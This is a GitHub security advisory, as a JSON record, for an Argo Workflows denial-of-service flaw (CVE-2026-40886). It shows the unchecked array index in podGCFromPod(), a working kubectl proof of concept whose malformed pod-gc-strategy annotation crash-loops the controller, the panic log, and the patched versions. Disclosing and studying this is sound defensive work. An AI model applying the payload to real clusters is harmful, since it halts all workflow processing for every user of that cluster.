{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/3088277?v=4", "events_url": "https://api.github.com/users/thevilledev/events{/privacy}", "followers_url": "https://api.github.com/users/thevilledev/followers", "following_url": "https://api.github.com/users/thevilledev/following{/other_user}", "gists_url": "https://api.github.com/users/thevilledev/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/thevilledev", "id": 3088277, "login": "thevilledev", "node_id": "MDQ6VXNlcjMwODgyNzc=", "organizations_url": "https://api.github.com/users/thevilledev/orgs", "received_events_url": "https://api.github.com/users/thevilledev/received_events", "repos_url": "https://api.github.com/users/thevilledev/repos", "site_admin": false, "starred_url": "https://api.github.com/users/thevilledev/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/thevilledev/subscriptions", "type": "User", "url": "https://api.github.com/users/thevilledev", "user_view_type": "public"}}], "cve_id": "CVE-2026-40886", "cvss": {"score": 7.7, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H"}, "cvss_severities": {"cvss_v3": {"score": 7.7, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-129", "name": "Improper Validation of Array Index"}], "description": "### Summary

An unchecked array index in the pod informer's `podGCFromPod()` function causes a controller-wide panic when a workflow pod carries a malformed `workflows.argoproj.io/pod-gc-strategy` annotation. Because the panic occurs inside an informer goroutine (outside the controller's `recover()` scope), it crashes the entire controller process. The poisoned pod persists across restarts, causing a crash loop that halts all workflow processing until the pod is manually deleted.

### Details

`podGCFromPod()` splits the annotation value on "/" and unconditionally accesses `parts[1]`:

```go
func podGCFromPod(pod *apiv1.Pod) wfv1.PodGC {
    if val, ok := pod.Annotations[common.AnnotationKeyPodGCStrategy]; ok {
        parts := strings.Split(val, "/")
        return wfv1.PodGC{Strategy: wfv1.PodGCStrategy(parts[0]), DeleteDelayDuration: parts[1]}
    }
    return wfv1.PodGC{Strategy: wfv1.PodGCOnPodNone}
}
```

If the annotation value contains no "/", `parts` has length 1 and `parts[1]` panics with index out of range.

The code was introduced in [#14129](https://github.com/argoproj/argo-workflows/issues/14129) and  affects versions:

  - 3.6.x: v3.6.5 through v3.6.19 (backport in [#14263](https://github.com/argoproj/argo-workflows/issues/14263))
  - 3.7.x: v3.7.0-rc1 through v3.7.12
  - 4.x: v4.0.0-rc1 through v4.0.3
  - Not affected: v3.6.4 and earlier

### PoC

Apply this workflow to a cluster running the Argo Workflows controller:

```bash
kubectl apply -n argo -f - <<'EOF'
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata:
  name: crash-podgc
spec:
  entrypoint: main
  serviceAccountName: default
  podGC:
    strategy: OnPodCompletion
  podMetadata:
    annotations:
      workflows.argoproj.io/pod-gc-strategy: "NoSlash"
  templates:
    - name: main
      container:
        image: alpine:3.18
        command: [echo, "hello"]
EOF
```

Within seconds the controller crashes. The controller pod will show `CrashLoopBackOff` with increasing restart count. Controller logs show:

```
panic: runtime error: index out of range [1] with length 1

goroutine 291 [running]:
github.com/argoproj/argo-workflows/v4/workflow/controller/pod.podGCFromPod(...)
    /home/runner/work/argo-workflows/argo-workflows/workflow/controller/pod/controller.go:176
github.com/argoproj/argo-workflows/v4/workflow/controller/pod.(*Controller).commonPodEvent(...)
    /home/runner/work/argo-workflows/argo-workflows/workflow/controller/pod/controller.go:197
github.com/argoproj/argo-workflows/v4/workflow/controller/pod.(*Controller).addPodEvent(...)
    /home/runner/work/argo-workflows/argo-workflows/workflow/controller/pod/controller.go:246
```

Recovery requires deleting the poisoned workflow:

```
kubectl delete workflow -n argo crash-podgc
```

### Impact

Any user who can submit workflows can crash the Argo Workflows controller and keep it down indefinitely. This is a denial-of-service against all workflows in the cluster. No workflows can make progress while the controller is crash-looping. The attacker needs only `create` permission on Workflow resources, which is the baseline permission for any Argo Workflows user.", "epss": {"percentage": 0.00377, "percentile": 0.29564}, "ghsa_id": "GHSA-5jv8-h7qh-rf5p", "github_reviewed_at": "2026-04-23T21:39:21Z", "html_url": "https://github.com/advisories/GHSA-5jv8-h7qh-rf5p", "identifiers": [{"type": "GHSA", "value": "GHSA-5jv8-h7qh-rf5p"}, {"type": "CVE", "value": "CVE-2026-40886"}], "nvd_published_at": "2026-04-23T19:17:28Z", "published_at": "2026-04-23T21:39:21Z", "references": ["https://github.com/argoproj/argo-workflows/security/advisories/GHSA-5jv8-h7qh-rf5p", "https://nvd.nist.gov/vuln/detail/CVE-2026-40886", "https://github.com/advisories/GHSA-5jv8-h7qh-rf5p"], "repository_advisory_url": "https://api.github.com/repos/argoproj/argo-workflows/security-advisories/GHSA-5jv8-h7qh-rf5p", "severity": "high", "source_code_location": "https://github.com/argoproj/argo-workflows", "summary": "Argo Workflows: Unchecked annotation parsing in pod informer crashes Argo Workflows Controller", "type": "reviewed", "updated_at": "2026-04-23T21:39:22Z", "url": "https://api.github.com/advisories/GHSA-5jv8-h7qh-rf5p", "vulnerabilities": [{"first_patched_version": "4.0.5", "package": {"ecosystem": "go", "name": "github.com/argoproj/argo-workflows/v4"}, "vulnerable_functions": [], "vulnerable_version_range": ">= 4.0.0, < 4.0.5"}, {"first_patched_version": "3.7.14", "package": {"ecosystem": "go", "name": "github.com/argoproj/argo-workflows/v3"}, "vulnerable_functions": [], "vulnerable_version_range": ">= 3.7.0, < 3.7.14"}, {"first_patched_version": null, "package": {"ecosystem": "go", "name": "github.com/argoproj/argo-workflows/v3"}, "vulnerable_functions": [], "vulnerable_version_range": ">= 3.6.5, <= 3.6.19"}], "withdrawn_at": null}

title: Argo Workflows: Unchecked annotation parsing in pod informer crashes Argo Workflows Controller
